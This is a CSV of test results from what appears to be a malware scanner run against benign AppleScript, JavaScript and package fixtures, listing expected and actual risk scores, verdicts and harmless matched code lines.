run_id,sample_id,group,subtype,fixture_kind,path,detected_type,score,verdict,expected_verdict,expected_score_min,expected_score_max,matched_verdict,matched_score_range,mismatch_reason,status,error_code,analysis_duration_ms,timestamp,has_findings,error,analysis_summary,finding_delta_total,findings
"2026-03-08T10-46-09Z-23e5dc","clean_app_manifest_01","clean","app","manifest_fixture","clean/app/clean_app_manifest_01.json","unknown","0","clean","clean","0","10","true","true","","completed","","26","2026-03-08T10:46:09.054Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage. | generic_partial: Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage."
"2026-03-08T10-46-09Z-23e5dc","clean_applescript_notification_01","clean","applescript","file_fixture","clean/applescript/clean_applescript_notification_01.applescript","appleScript","0","clean","clean","0","12","true","true","","completed","","16","2026-03-08T10:46:09.071Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","clean_applescript_open_finder_01","clean","applescript","file_fixture","clean/applescript/clean_applescript_open_finder_01.applescript","appleScript","1","clean","clean","0","8","true","true","","completed","","16","2026-03-08T10:46:09.087Z","true","","该样本规则 applescript.finder_control 命中，按上下文归一化后计入风险。。综合评分 1/100，判定 Clean（低风险）。","1","检测到脚本高风险行为特征 | [applescript.finder_control] 控制 Finder 行为 [low] L2-2 Δ8: tell application ""Finder"""
"2026-03-08T10-46-09Z-23e5dc","clean_applescript_prompt_01","clean","applescript","file_fixture","clean/applescript/clean_applescript_prompt_01.applescript","appleScript","0","clean","clean","0","6","true","true","","completed","","15","2026-03-08T10:46:09.103Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","clean_applescript_textedit_newdoc_01","clean","applescript","file_fixture","clean/applescript/clean_applescript_textedit_newdoc_01.applescript","appleScript","0","clean","clean","0","8","true","true","","completed","","15","2026-03-08T10:46:09.119Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","clean_js_base64_demo_01","clean","js","file_fixture","clean/js/clean_js_base64_demo_01.js","javaScript","4","clean","clean","3","15","true","true","","completed","","15","2026-03-08T10:46:09.134Z","true","","该样本规则 javascript.base64_obfuscation 命中，按上下文归一化后计入风险。；规则 javascript.base64_obfuscation 命中，按上下文归一化后计入风险。。综合评分 4/100，判定 Clean（低风险）。","4","检测到混淆或编码逃逸 | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L3-3 Δ14: const encoded = Buffer.from(source, 'utf8').toString('base64'); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L4-4 Δ14: const decoded = Buffer.from(encoded, 'base64').toString('utf8');"
"2026-03-08T10-46-09Z-23e5dc","clean_js_child_process_echo_01","clean","js","file_fixture","clean/js/clean_js_child_process_echo_01.js","javaScript","22","clean","clean","5","18","true","false","score_too_high","completed","","14","2026-03-08T10:46:09.148Z","true","","该样本规则 javascript.child_process 命中，按上下文归一化后计入风险。；规则 javascript.child_process 命中，按上下文归一化后计入风险。。综合评分 22/100，判定 Clean（低风险）。","22","检测到脚本高风险行为特征 | [javascript.child_process] Node child_process 执行链 [high] L2-2 Δ22: const { execFile } = require('child_process'); | [javascript.child_process] Node child_process 执行链 [high] L12-12 Δ22: console.log('[clean] child_process output:', stdout.trim()); | Script analyzer detected 2 high-severity findings. | generic_partial: Script analyzer detected 2 high-severity findings."
"2026-03-08T10-46-09Z-23e5dc","clean_js_config_merge_01","clean","js","file_fixture","clean/js/clean_js_config_merge_01.js","javaScript","0","clean","clean","0","12","true","true","","completed","","14","2026-03-08T10:46:09.163Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","clean_js_read_local_config_02","clean","js","file_fixture","clean/js/clean_js_read_local_config_02.js","javaScript","0","clean","clean","0","8","true","true","","completed","","13","2026-03-08T10:46:09.176Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","clean_pkg_receipt_stub_01","clean","pkg","descriptor_fixture","clean/pkg/clean_pkg_receipt_stub_01.json","unknown","0","clean","clean","0","10","true","true","","completed","","18","2026-03-08T10:46:09.195Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage. | generic_partial: Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage."
